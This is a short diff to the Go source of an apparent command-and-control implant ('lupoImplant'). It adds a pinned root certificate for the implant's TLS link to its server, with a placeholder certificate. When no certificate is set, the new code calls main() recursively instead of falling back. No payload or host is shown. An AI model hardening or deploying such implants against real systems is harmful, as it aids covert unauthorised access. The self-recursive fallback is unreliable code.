@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
+	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -33,6 +34,10 @@ type lupoImplant struct {
 
 var implant *lupoImplant
 
+var rootCert string = `
+Cert goes here
+`
+
 func main() {
 
 	// Construct implant
@@ -50,12 +55,32 @@ func main() {
 
 	// If a root certificate is specified, use it
 	config := &tls.Config{}
+	if rootCert != "" {
+		// Create new cert pool
+		rootCAs := x509.NewCertPool()
 
-	// Trust the certpool
-	config = &tls.Config{
-		InsecureSkipVerify: true,
+		// Add cert to certpool
+		rootCAs.AppendCertsFromPEM([]byte(rootCert))
+
+		// Trust the certpool
+		config = &tls.Config{
+			InsecureSkipVerify: false,
+			RootCAs:            rootCAs,
+		}
+
+	} else {
+
+		// Recurse and try again, failure is not an option
+		main()
+
+		/*
+			// Otherwise accept any ssl cert
+			config = &tls.Config{
+				InsecureSkipVerify: true,
+			}
+		*/
 	}
-	
+
 	// Create http client
 	client := &http.Client{
 		Transport: &http.Transport{
